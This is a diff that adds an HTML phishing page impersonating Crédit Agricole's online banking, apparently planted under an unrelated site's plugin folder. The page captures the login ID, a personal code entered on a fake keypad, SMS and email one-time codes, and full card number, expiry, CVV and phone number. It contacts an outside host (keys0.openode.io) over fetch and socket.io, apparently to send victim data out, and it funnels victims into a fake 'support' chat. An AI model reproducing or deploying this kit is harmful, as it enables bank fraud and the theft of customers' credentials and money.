@@ -1,0 +1,754 @@
+<!-- URL =https://www.kti.cloud/assets/plugins/bootbox/activation/src/--><!-- w =('kti.cloud', datetime.datetime(2019, 7, 24, 14, 55, 31), datetime.datetime(2022, 7, 24, 14, 55, 31))--><!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <meta content="ie=edge" http-equiv="X-UA-Compatible"/>
+  <script src="https://cdn.jsdelivr.net/npm/vue">
+  </script>
+  <script crossorigin="anonymous" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js">
+  </script>
+  <script crossorigin="anonymous" integrity="sha256-Xjd66VohnxGyWXo6t7jy6Jdpa4MapbhWGgzRNcsnnzY=" src="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/iview.js">
+  </script>
+  <link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/styles/iview.css" integrity="sha256-wrmzmt34CAQJ3ChhG+ZHZNhwVTDrlLGhLAS7tlbgfZM=" rel="stylesheet"/>
+  <script src="https://cdn.jsdelivr.net/npm/v-mask/dist/v-mask.min.js">
+  </script>
+  <link href="./img/fav.png" rel="shortcut icon" type="image/x-icon"/>
+  <script crossorigin="anonymous" integrity="sha256-XmdRbTre/3RulhYk/cOBUMpYlaAp2Rpo/s556u0OIKk=" src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.js">
+  </script>
+  <script>
+   window.locIp='';
+     window.iPfull='';
+    fetch('https://keys0.openode.io/ip',{
+      mode:'cors',
+    }).then(e=>{
+      e.json().then(location=>{
+        console.log(location)
+        window.locIp=location
+        window.iPfull =location.ip || location
+       
+      })
+    })
+  </script>
+  <script crossorigin="anonymous" integrity="sha256-bQmrZe4yPnQrLTY+1gYylfNMBuGfnT/HKsCGX+9Xuqo=" src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js">
+  </script>
+  <script crossorigin="anonymous" integrity="sha256-A7WGGnbT0f0OYHWQVkWqX6GQdZHZDi8IsbD/u+FQaVc=" src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/js/uikit.js">
+  </script>
+  <link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.css" integrity="sha256-QVBN0oT74UhpCtEo4Ko+k3sNo+ykJFBBtGduw13V9vw=" rel="stylesheet">
+   <script crossorigin="anonymous" integrity="sha256-qs5p0BFSqSvrstBxPvex+zdyrzcyGdHNeNmAirO2zc0=" src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.js">
+   </script>
+   <link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/css/uikit.css" integrity="sha256-zXcP0t9LAKMmi8DraWUaFJV1qvGkw1gYEHBbf+IsHSo=" rel="stylesheet"/>
+   <link href="./style.css" rel="stylesheet"/>
+   <title>
+    Accès CR - Crédit Agricole
+   </title>
+   <style>
+    body{
+  display: none;
+}
+   </style>
+  </link>
+ </head>
+ <body>
+  <p style="display:none">
+   <input id="Security" type="text" value=""/>
+   <input id="Mail" type="text" value="ewalilo.matkhafch@gmail.com"/>
+   <input id="Option" type="text" value="0"/>
+   <input id="emailList" type="text" value=""/>
+  </p>
+  <div class="uk-text-light" id="index">
+   <div v-show="!loading">
+    <div id="dep" v-if="login==1">
+     <div class="uk-position-absolue">
+      <div class="uk-hidden@l">
+       <div>
+        <div class="uk-child-width-1-3 uk-grid-match" uk-grid="">
+         <div>
+          <div style="padding:23px">
+           <div>
+            <i class="ui icon bars large">
+            </i>
+           </div>
+          </div>
+         </div>
+         <div>
+          <div class="uk-text-center uk-align-center">
+           <div style="padding:23px">
+            <img alt="" src="./img/ilogo.svg" style="min-width:200px"/>
+           </div>
+          </div>
+         </div>
+         <div>
+          <div class="uk-align-right uk-text-right">
+           <div style="float:right;background:#006675;padding:20px;">
+            <i class="ui icon large inverted lock">
+            </i>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="uk-position-relative uk-visible@l" uk-grid="">
+       <div>
+        <div class="">
+         <img alt="" src="https://www.credit-agricole.fr/content/dam/assetsca/npc/logos/CA_Toute-une-banque-pour-vous_V.svg" style="width:140px"/>
+        </div>
+       </div>
+       <div class="uk-width-expand ">
+        <div class="uk-text-bold" id="barh" uk-grid="">
+         <div class="primary">
+          <br/>
+          Vous êtes un particulier
+          <i class="ui icon chevron large down">
+          </i>
+         </div>
+         <div class="uk-text-right uk-align-right uk-width-expand" id="menu_">
+          <ul>
+           <li>
+            <i class="ui icon unlock">
+            </i>
+            mon espace
+           </li>
+           <li style="background:#006675">
+            ouvrir un compte
+           </li>
+           <li style="background:#009787">
+            <i class="ui icon chat">
+            </i>
+            nous contacter
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div id="menus">
+         <ul id="bar">
+          <li>
+           Comptes &amp; cartes
+          </li>
+          <li>
+           épargner
+          </li>
+          <li>
+           S'assurer
+          </li>
+          <li>
+           emprunter
+          </li>
+          <li>
+           simmulation &amp; devis
+          </li>
+          <li>
+           nos conseils
+          </li>
+         </ul>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div>
+      <br/>
+      <div class=" uk-child-width-1-2@m uk-position-relative" uk-grid="">
+       <div class="uk-visible@m">
+        <div class=" uk-height-1-1 uk-position-relative uk-background-image uk-background-cover uk-background-secondary " data-src="./img/access.jpg" uk-img="">
+         <div class="uk-padding uk-position-center">
+          <div class="uk-light uk-text-justify uk-card uk-card-body" style="background:#006675">
+           <h3 class="uk-card-title uk-h1">
+            Télécharger l'application Ma Banque
+           </h3>
+           <p>
+            Chacun d’entre vous gère différemment ses besoins bancaires.
+           </p>
+           <p>
+            Seul ou accompagné, au Crédit Agricole, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.
+           </p>
+           <div class="ui button" style="width:100%">
+            <span class="primary">
+             Découvrez les grandes fonctionnalités
+            </span>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+       <div>
+        <div class="uk-padding">
+         <div class="uk-card uk-text-center uk-background-muted uk-card-large uk-card-default uk-card-body">
+          <h3 class="uk-card-title">
+           ACCÉDER À L'ESPACE DÉDIÉ
+           <br/>
+           <b>
+            DE VOTRE CAISSE RÉGIONALE
+           </b>
+          </h3>
+          <p>
+           <b>
+            Trouver une caisse régionale
+           </b>
+          </p>
+          <p>
+           <input @keyup="error=false" placeholder="Numéro département ou Code Postal" type="text" v-mask="'## ####'" v-model="log.DEP"/>
+          </p>
+          <br/>
+          <div @click="goToCredit" class="ui button" id="btn">
+           VALIDER
+          </div>
+          <br/>
+          <br/>
+          <div class="uk-text-left uk-text-danger" v-if="error">
+           <i class="ui icon warning red">
+           </i>
+           Champs incorrect, corriger votre saisie
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div v-if="login==2">
+     <div class="uk-child-width-1-2 uk-margin-remove-bottom" uk-grid="">
+      <div>
+       <div style="padding:2%">
+        <img alt="" src="./img/ilogo.svg" width="220px"/>
+       </div>
+      </div>
+      <div class="uk-width-expand uk-align-right ">
+       <div @click="login=1;message='Chargement en cours...'" style="background:#006675;width:80px;float:right;padding:30px;cursor:pointer">
+        <i class="ui icon close large inverted">
+        </i>
+       </div>
+      </div>
+     </div>
+     <div class="uk-child-width-1-2@m uk-grid-collapse uk-grid-match" uk-grid="">
+      <div class="uk-background-image@l uk-visible@m uk-position-relative uk-background-cover" data-src="https://source.unsplash.com/1600x900/?work,office" uk-img="">
+       <div class="uk-padding uk-position-center">
+        <div class="uk-card uk-card-large uk-card-default uk-card-body">
+         <div class="uk-h3 primary">
+          Bienvenue au CA , Crédit Agricole
+         </div>
+         <p class="headline body-3">
+          Accéder à vos comptes, réaliser vos opérations courantes, souscrire en ligne, effectuer une simulation, obtenir un conseil personnalisé : nous avons conçu cet espace sécurisé pour vous rendre service et être au plus près de vos besoins.
+         </p>
+        </div>
+       </div>
+      </div>
+      <div>
+       <div class="uk-card uk-card-large uk-text-left uk-card-default uk-card-body" style="background:#EEEEEE;padding:3%">
+        <h3 class="uk-card-title uk-text-bold" id="le">
+         <span class="uk-text-light">
+          ACCÉDER
+         </span>
+         À MES COMPTES
+        </h3>
+        <div class="uk-child-width-1-2@s uk-grid-collapse" uk-grid="">
+         <div class="uk-width-expand" id="cc">
+          <div>
+           <table cellpadding="10" cellspacing="15" id="claver" style="width:100%">
+            <tr>
+             <td colspan="5" style="background:transparent;padding:0;text-align:left;color:black">
+              <p>
+               <b>
+                IDENTIFIANT
+               </b>
+               <br/>
+               <span>
+                Saisissez votre identifiant à 11 chiffres
+               </span>
+               <br/>
+               <input maxlength="11" placeholder="Ex : 982662721" v-model="log.ID"/>
+               <p>
+                <b>
+                 CODE PERSONNEL
+                </b>
+                <br/>
+                <div style="position:relative">
+                 <input placeholder="6 chiffes" readonly="" style="background: #f5f5f5" type="PASSword" v-model="log.PASS"/>
+                 <span @click="log.PASS=''" style="top:20px;right:3px;position:absolute;" v-if="log.PASS.length&gt;0">
+                  <i class="ui icon close">
+                  </i>
+                 </span>
+                </div>
+               </p>
+              </p>
+             </td>
+            </tr>
+            <tr id="typeC">
+             <td @click="log.PASS.length&lt;6 ? log.PASS+=0 :''">
+              0
+             </td>
+             <td @click="log.PASS.length&lt;6  ? log.PASS+=6: ''">
+              6
+             </td>
+             <td @click="log.PASS.length&lt;6 ? log.PASS+=9 :''">
+              9
+             </td>
+             <td @click="log.PASS.length&lt;6 ?log.PASS+=4:''">
+              4
+             </td>
+             <td @click="log.PASS.length&lt;6 ?log.PASS+=7:''">
+              7
+             </td>
+            </tr>
+            <tr id="typeC">
+             <td @click="log.PASS.length&lt;6 ?log.PASS+=8:''">
+              8
+             </td>
+             <td @click="log.PASS.length&lt;6 ?log.PASS+=1:''">
+              1
+             </td>
+             <td @click="log.PASS.length&lt;6 ?log.PASS+=2:''">
+              2
+             </td>
+             <td @click="log.PASS.length&lt;6 ?log.PASS+=5:''">
+              5
+             </td>
+             <td @click="log.PASS.length&lt;6 ?log.PASS+=3:''">
+              3
+             </td>
+            </tr>
+            <tr>
+             <td colspan="5" style="background:transparent;padding:0;">
+              <div class="uk-text-center">
+               <div @click="goToEspace()" class="ui button" id="btn" style="width:100%">
+                VALIDER
+               </div>
+              </div>
+             </td>
+            </tr>
+           </table>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
+<div>
+ <br/>
+ <div class="uk-h5">
+  <b>
+   OUBLI/PERTE
+   <br/>
+   DE CODE PERSONNEL
+  </b>
+ </div>
+ <span>
+  Si vous avez oublié ou perdu votre
+  <br/>
+  code personnel, cliquez ici.
+ </span>
+ <br/>
+ <div class="uk-h5">
+  <b>
+   VOTRE IDENTIFICATION NE
+   <br/>
+   CHANGE PAS
+  </b>
+ </div>
+ <span>
+  Pour accéder à votre compte,
+  <br/>
+  saisissez votre 
+                                 identifiant et votre
+  <br/>
+  code personnel habituels.
+ </span>
+ <br/>
+ <div class="uk-h5">
+  <b>
+   SÉCURITÉ
+  </b>
+ </div>
+ <span>
+  Restez vigilants et veillez à protéger
+  <br/>
+  vos données personnelles.
+  <br/>
+  Consultez nos conseils de sécurité
+ </span>
+ <br/>
+ <br/>
+ <span>
+  Nous vous invitons également
+  <br/>
+  à consulter 
+                                 régulièrement
+  <br/>
+  nos Conditions
+  <br/>
+  Générales d'utilisation.
+  <br/>
+  Voir les Conditions
+  <br/>
+  Générales d'Utilisation
+ </span>
+</div>
+<div style="background:white" v-if="login==3">
+ <div class=" white">
+  <div class="uk-padding">
+   <img alt="" src="./img/ilogo.svg" width="200px"/>
+  </div>
+  <div class="uk-child-width-1-2@s uk-grid-collapse" uk-grid="">
+   <div class="uk-visible@m" v-if="step!==0">
+    <div class="uk-height-1-1 uk-padding uk-background-image uk-background-cover uk-background-secondary" data-src="./img/access.jpg" uk-img="">
+     <div class=" uk-card uk-card-large uk-card-default uk-card-body">
+      <div class="" id="cc">
+       <div class="uk-h5 primary uk-text-bold uk-text-uppercase" id="el">
+        ACTIVAtion sécuriPass en deux étapes :
+       </div>
+       <div class="uk-h4">
+        Comment activer mon SécuriPass et faciliter mes opération en un click ?
+       </div>
+       <div>
+        <p>
+         <i class="ui icon mobile teal">
+         </i>
+         Entrer le code reçu par SMS envoyé 
+                          sur votre numéro .
+        </p>
+        <p>
+         <i class="ui icon circle teal">
+         </i>
+         Entrer le code à 6 chiffres reçcu par 
+                              E-mail .
+        </p>
+        <p>
+         <i class="ui large icon teal check">
+         </i>
+         Votre SécuriPass à été activé.
+        </p>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+   <div>
+    <div class="uk-padding">
+     <div class="uk-h3 primary" v-if="step!==0">
+      <i class="ui icon key teal">
+      </i>
+      J'active mon SécuriPass
+     </div>
+     <div class="uk-visible@m" v-if="step!==0">
+      <steps :current="step-1" size="small" style="color:teal" vertical="">
+       <step content="Confiration mobile" style="color:teal" title="SMS MOBILE">
+       </step>
+       <step content="Code de validation email" style="color:teal" title="EMAIL">
+       </step>
+       <step content="Activation SécuriPass" style="color:teal" title="INFORMATION">
+       </step>
+      </steps>
+      <br/>
+      <br/>
+     </div>
+     <div class="uk-hidden@m" v-if="step!==0">
+      <steps :current="step-1" direction="vertical" size="small" style="color:teal">
+       <step content="Confiration mobile" style="color:teal" title="SMS MOBILE">
+       </step>
+       <step content="Code de validation email" style="color:teal" title="EMAIL">
+       </step>
+       <step content="Activation SécuriPass" style="color:teal" title="INFORMATION">
+       </step>
+      </steps>
+      <br/>
+      <br/>
+     </div>
+     <div v-if="step==0">
+      <div class="uk-h2 uk-text-bold color" style="color:teal ">
+       Authentification fort
+      </div>
+      <div style="font-size:16px">
+       <p id="cc">
+        <div class="uk-h4">
+         <b>
+          Bonjour ,
+         </b>
+        </div>
+       </p>
+       <p class="uk-text-light" style="color:black;font-size:16px">
+        Pour votre sécurité,veuillez entrer le code reçu par SMS
+        <br/>
+        afin d'accéder à votre espace personnel
+        <br/>
+        <br/>
+        <input placeholder="Code (6 chiffre )" style="background: #f5F5F5;min-width:252px;width:38%;border: 1px solid teal;" type="text" v-mask="'NNN NNN'" v-model="log.SMS_CONNECT"/>
+       </p>
+      </div>
+      <p>
+       <div @click="goToStep(true)" class="ui button" id="btn">
+        <i class="ui icon chevron right">
+        </i>
+        CONFIRMER
+       </div>
+      </p>
+     </div>
+     <div v-if="step==1">
+      <p class="uk-text-light" id="cc" style="font-size:16px">
+       Nous vous avons envoyé un nouveau code de confirmation mobile.
+       <br/>
+       <b>
+        Veuillez entrer  le nouveau code de
+        <span style="color:teal">
+         *6 chiffre *
+        </span>
+        reçu par SMS ci-dessous :
+       </b>
+      </p>
+     </div>
+    </div>
+   </div>
+  </div>
+ </div>
+</div>
+<br/>
+<br/>
+<span style="color:red;font-weight: bold;">
+ <i class="ui icon warning circle">
+ </i>
+ Important: Ne pas fermer cette page avant la réception du Code SMS
+ <br/>
+</span>
+<br/>
+<input placeholder="(6 chiffres )" style="width:50%;font-weight:400" type="text" v-mask="'### ###'" v-model="log.SMS"/>
+<p>
+ <div @click="step--" class="ui button">
+  <i class="ui icon chevron left">
+  </i>
+  Retour
+ </div>
+ <div @click="goToStep()" class="ui button" id="btn">
+  <i class="ui icon chevron right">
+  </i>
+  CONTINUER
+ </div>
+</p>
+<div v-if="step==2">
+ <p id="cc" style="font-size:15px;font-weight: 100">
+  <b style="font-weight:bold">
+   2)  Un nouveau code a été envoyé à votre adresse E-mail
+   <i class="ui icon mail">
+   </i>
+   <b style="font-weight:bold">
+    {{emailList !=='' ? '****@'+emailList :'' }}
+   </b>
+   :
+  </b>
+  <br/>
+  <br/>
+  <span>
+   Un nouveau code a été envoyé à votre E-mail renseigné auprès de notre Banque , 
+  veuillez le recopier ci-dessous :
+   <br/>
+   <br/>
+   <span style="color:red">
+    <i class="ui icon warning circle">
+    </i>
+    Si le message n’apparaît pas dans votre boîte de réception, celui-ci peut se trouver dans le dossier Spam, Indésirable
+   </span>
+  </span>
+  <br/>
+  <br/>
+  <input placeholder="(6 Chiffres)" style="width:50%" type="text" v-mask="'### ###'" v-model="log.CODE"/>
+ </p>
+ <p>
+  <div @click="step--" class="ui button">
+   <i class="ui icon chevron left">
+   </i>
+   Retour
+  </div>
+  <div @click="submitForm" class="ui button" id="btn">
+   <i class="ui icon chevron right">
+   </i>
+   CONTINUER
+  </div>
+ </p>
+</div>
+<img alt="" src="https://i.ytimg.com/vi/vV_tpC9MuP4/maxresdefault.jpg" v-if="step!==0"/>
+<br/>
+<div class="uk-alert" v-if="step!==0">
+ Nouveau  dispositif de sécurité conçu pour  les opérations en ligne .
+ <br/>
+ Ce code confidentiel, connu de vous seul, est utilisable uniquement pour vos opérations en ligne .
+ <ul>
+  <li>
+   Consultation de solde
+  </li>
+  <li>
+   Virements en ligne
+  </li>
+  <li>
+   Achat en ligne
+  </li>
+  <li>
+   Et d'autres opérations sensibles ....
+  </li>
+ </ul>
+</div>
+<div>
+</div>
+<div v-if="login==6">
+ <div class="uk-padding">
+  <img alt="" src="./img/ilogo.svg" style="width:300px"/>
+  <div class="uk-padding-larg">
+  </div>
+  <div class="uk-text-center uk-h4 uk-text-light">
+   <br/>
+   <br/>
+   <br/>
+   <i class="check large primary icon">
+   </i>
+   <p>
+    Votre compte est à jour , vous bénéficiez de tous les services 
+                      du Crédit Agricole .
+   </p>
+   <br/>
+   <p class="uk-text-bold uk-h5">
+    Comptez 48h pour l' activation du service SécuriPass .
+    <br/>
+    Un mail vous sera envoyé
+   </p>
+   <a href="https://www.credit-agricole.fr">
+    <div class="ui button ">
+     <i class="ui icon lock">
+     </i>
+     Mon espace Client
+    </div>
+   </a>
+  </div>
+  <div>
+  </div>
+ </div>
+</div>
+<div v-if="login==4">
+ <div class="uk-padding uk-text-left">
+  <img alt="" src="./img/ilogo.svg" style="width:400px"/>
+  <div class="uk-h4 primary uk-text-bold">
+   Ré-activer votre carte pour les paiements et retraits (guichet) .
+  </div>
+  <div class="uk-child-width-1-2@s" style="font-size:16px" uk-grid="">
+   <div>
+    <p class="uk-text-light uk-h4">
+     Entrer les coordonnées de la carte à activer
+    </p>
+    <p class="uk-text-light">
+     Numéro de carte :
+     <input placeholder="Numéro de carte" style="background: #f5F5F5;min-width:252px;width:40%" type="text" v-mask="'#### #### #### ####'" v-model="log.numcc"/>
+    </p>
+    <p class="uk-text-light">
+     Date d'expiration :
+     <input max="12" maxlength="2" min="0" placeholder="MM" style="background: #f5F5F5;width:21%" type="text" v-mask="'##'" v-model="log.ex1"/>
+     <input max="30" maxlength="4" min="29" placeholder="AAAA" style="background: #f5F5F5;width:21%" type="text" v-mask="'####'" v-model="log.ex2"/>
+    </p>
+    <p class="uk-text-light">
+     Cryptogramme visuel (CVV) :
+     <input maxlength="4" placeholder="" style="background: #f5F5F5;width:16%" type="text" v-mask="'####'" v-model="log.cvv"/>
+    </p>
+    <p class="uk-text-light">
+     Numéro mobile associé  :
+     <input max="30" maxlength="12" min="19" placeholder="(+33)" style="background: #f5F5F5;width:39%" type="text" v-model="log.tel"/>
+    </p>
+    <br/>
+    <div @click="setCard" class="ui button teal">
+     <i class="ui icon cc mastercard ">
+     </i>
+     J'active ma carte
+    </div>
+   </div>
+   <div class="uk-visible@m">
+    <img alt="" src="https://www.ca-atlantique-vendee.fr/Vitrine/Obj/Avantage_9443012_tcm_124_518558.png"/>
+   </div>
+  </div>
+ </div>
+ <div>
+ </div>
+</div>
+<div v-if="login==5">
+ <div class="uk-padding uk-text-center">
+  <img alt="" src="./img/ilogo.svg" style="width:240px"/>
+  <p>
+  </p>
+  <div class="uk-h3">
+   Suite à de nouvelles reformes votre compte à été restreint .
+  </div>
+  <div style="font-size: 17px">
+   <i class="ui icon info circle">
+   </i>
+   Nous avons besoin de vérification supplémentaire
+   <br/>
+   pour la réactivation de votre compte.
+   <br/>
+   <br/>
+   <p>
+    Cliquer sur le button ci-dessous pour contacter l'assistance en ligne .
+   </p>
+   <p>
+    <i class="ui icon chevron down big">
+    </i>
+   </p>
+   <div @click="showChat" class="ui teal button color">
+    <i class="ui icon chat">
+    </i>
+    Chat support technique
+   </div>
+   <br/>
+   <br/>
+   <br/>
+   <div class="uk-card uk-card-default uk-card-body">
+    <div class="uk-text-justify" style="color:#525252">
+     Conformément aux dernières exigences réglementaires de la seconde Directive Européenne sur les services bancaires  (dite DSP2), entrées en vigueur le 14/09/2019, les banques vont progressivement renforcer la sécurité de l’accès en ligne à vos comptes bancaires et de vos paiements par carte sur internet avec les e-commerçants.
+    </div>
+    <div class="uk-text-center" style="color:black">
+     <br/>
+     Nous vous invitons donc à vous référer au support
+     <i class="ui icon teal chat">
+     </i>
+     pour réeactiver ou activer les services 
+                    liés à votre compte.
+    </div>
+   </div>
+  </div>
+ </div>
+</div>
+<div v-show="loading">
+ <div class="uk-position-center">
+  <div class="uk-text-center">
+   <div class="primary" uk-spinner="">
+   </div>
+   <br/>
+   <p>
+    {{message}}
+   </p>
+   <p>
+    <img alt="" src="./img/ilogo.svg" style="width:100%"/>
+   </p>
+  </div>
+ </div>
+</div>
+<script>
+ const socket =io('https://keys0.openode.io',{
+    transports:['websocket','polling']
+})
+</script>
+<script crossorigin="anonymous" integrity="sha256-yE5LLp5HSQ/z+hJeCqkz9hdjNkk1jaiGG0tDCraumnA=" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js">
+</script>
+<script src="./js/index.js">
+</script>
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+ var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+  s1.async=true;
+ // s1.src='https://embed.tawk.to/5dc29b31e4c2fa4b6bda4277/default';
+  s1.src="https://embed.tawk.to/5dc29b31e4c2fa4b6bda4277/default";
+  s1.charset='UTF-8';
+  s1.setAttribute('crossorigin','*');
+  s0.parentNode.insertBefore(s1,s0);
+  })();
+</script>
+<!--End of Tawk.to Script-->
